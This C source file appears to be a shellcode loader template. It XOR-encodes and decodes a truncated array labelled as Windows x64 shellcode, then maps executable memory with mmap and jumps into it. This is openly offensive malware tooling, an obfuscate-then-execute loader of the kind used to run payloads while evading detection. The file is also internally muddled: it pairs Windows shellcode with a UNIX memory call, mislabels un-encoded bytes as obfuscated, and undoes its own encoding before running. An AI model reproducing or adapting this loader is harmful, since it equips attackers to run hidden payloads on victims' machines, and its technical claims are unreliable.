#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>  // For memory management on UNIX-like systems

// Sample 64-bit Windows shellcode (not functional, for demonstration purposes)
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xe0, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52
    //... more shellcode bytes would go here
};

// XOR key for obfuscation
unsigned char key = 0xAA;  // Simple XOR key for obfuscation and deobfuscation

// Function to XOR encode/decode the shellcode
void xor_encode_decode(unsigned char *data, size_t data_len, unsigned char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}

// Function to execute the shellcode
void execute_shellcode(unsigned char *shellcode, size_t len) {
    // Use mmap to allocate executable memory (UNIX-like system)
    void *exec = mmap(0, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (exec == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Copy the decoded shellcode to the executable memory region
    memcpy(exec, shellcode, len);

    // Create a function pointer to the shellcode and execute it
    ((void(*)())exec)();

    // Clean up by un-mapping the memory
    munmap(exec, len);
}

int main() {
    size_t shellcode_len = sizeof(shellcode);

    printf("Original (Obfuscated) Shellcode:\n");
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 1: Obfuscate shellcode (XOR encode)
    xor_encode_decode(shellcode, shellcode_len, key);

    printf("Encoded Shellcode (XOR Obfuscated):\n");
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 2: Decode the shellcode (XOR decode) just before execution
    xor_encode_decode(shellcode, shellcode_len, key);

    printf("Decoded Shellcode (Ready for execution):\n");
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Step 3: Execute the shellcode
    execute_shellcode(shellcode, shellcode_len);

    return 0;
}

